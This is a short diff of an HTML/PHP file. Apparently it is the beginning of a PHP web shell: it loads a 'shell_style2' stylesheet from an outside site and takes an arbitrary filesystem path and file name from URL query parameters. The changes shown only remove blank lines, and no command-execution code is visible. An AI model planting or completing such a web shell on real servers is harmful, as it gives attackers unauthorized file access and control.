@@ -1,20 +1,15 @@
 <!DOCTYPE html>
 <html>
-
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="https://naxtarrr.netlify.app/assets/css/shell_style2.css">
 </head>
-
 <body>
   <?php
   $path = (isset($_GET["x"])) ? $_GET["x"] : getcwd();
   $file = (isset($_GET["file"])) ? $_GET["file"] : "";
-
   $os = php_uname('s');
-
   $separator = ($os === 'Windows') ? "\\" : "/";
-
   $explode = explode($separator, $path);
   ?>
 
